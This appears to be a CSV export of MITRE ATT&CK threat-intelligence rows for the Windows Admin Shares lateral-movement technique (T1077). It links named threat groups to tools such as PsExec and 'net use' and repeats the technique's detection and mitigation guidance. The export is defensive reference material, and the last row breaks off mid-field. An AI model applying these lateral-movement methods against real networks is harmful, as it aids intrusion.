1293,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0029|PsExec]], a tool that has been used by adversaries, writes programs to the <code>ADMIN$</code> network share to execute commands on remote systems.[[CiteRef::PsExec Russinovich]]']",['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],Software: PsExec,['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1294,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0056|Net Crawler]] uses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement.[[CiteRef::Cylance Cleaver]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],"Software: Net Crawler, NetC",['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1295,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['Lateral movement can be done with [[Software/S0039|Net]] through <code>net use</code> commands to connect to the [[Windows admin shares]] on remote systems.[[CiteRef::Savill 1999]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],"Software: Net, net.exe",['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1296,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0004|Ke3chang]] actors have been known to copy files to the network shares of other computers to move laterally.[[CiteRef::Villeneuve et al 2014]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],[],['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1297,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['Lateral movement can be done with [[Software/S0039|Net]] through <code>net use</code> commands to connect to the [[Windows admin shares]] on remote systems.[[CiteRef::Savill 1999]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],"Software: Net, net.exe",['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1298,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['Lateral movement can be done with [[Software/S0039|Net]] through <code>net use</code> commands to connect to the [[Windows admin shares]] on remote systems.[[CiteRef::Savill 1999]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],"Software: Net, net.exe",['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1299,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0010|Turla]] uses <code>net use</code> commands to connect to lateral systems within a network.[[CiteRef::Kaspersky Turla]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],[],['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1300,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0089|BlackEnergy]] has run a plug-in on a victim to spread through the local network by using [[Software/S0029|PsExec]] and accessing admin shares.[[CiteRef::Securelist BlackEnergy Nov 2014]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],"Software: BlackEnergy, Black Energy",['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1301,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0029|PsExec]], a tool that has been used by adversaries, writes programs to the <code>ADMIN$</code> network share to execute commands on remote systems.[[CiteRef::PsExec Russinovich]]']",['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],Software: PsExec,['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1302,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['Lateral movement can be done with [[Software/S0039|Net]] through <code>net use</code> commands to connect to the [[Windows admin shares]] on remote systems.[[CiteRef::Savill 1999]]'],['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],"Software: Net, net.exe",['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1303,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0028|Threat Group-1314]] actors mapped network drives using <code>net use</code>.[[CiteRef::Dell TG-1314]]'],['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],[],['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1304,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0029|PsExec]], a tool that has been used by adversaries, writes programs to the <code>ADMIN$</code> network share to execute commands on remote systems.[[CiteRef::PsExec Russinovich]]']",['Naikon'],['Naikon'],['G0019'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],Software: PsExec,['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1305,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['Lateral movement can be done with [[Software/S0039|Net]] through <code>net use</code> commands to connect to the [[Windows admin shares]] on remote systems.[[CiteRef::Savill 1999]]'],['Naikon'],['Naikon'],['G0019'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],"Software: Net, net.exe",['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1306,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']",['Lateral movement can be done with [[Software/S0039|Net]] through <code>net use</code> commands to connect to the [[Windows admin shares]] on remote systems.[[CiteRef::Savill 1999]]'],['admin@338'],['admin@338'],['G0018'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],"Software: Net, net.exe",['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1307,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0029|PsExec]], a tool that has been used by adversaries, writes programs to the <code>ADMIN$</code> network share to execute commands on remote systems.[[CiteRef::PsExec Russinovich]]']",['FIN6'],['FIN6'],['G0037'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],Software: PsExec,['Lateral Movement'],['Technique/T1077'],['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1308,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0029|PsExec]], a tool that has been used by adversaries, writes programs to the <code>ADMIN$</code> network share to execute commands on remote systems.[[CiteRef::PsExec Russinovich]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 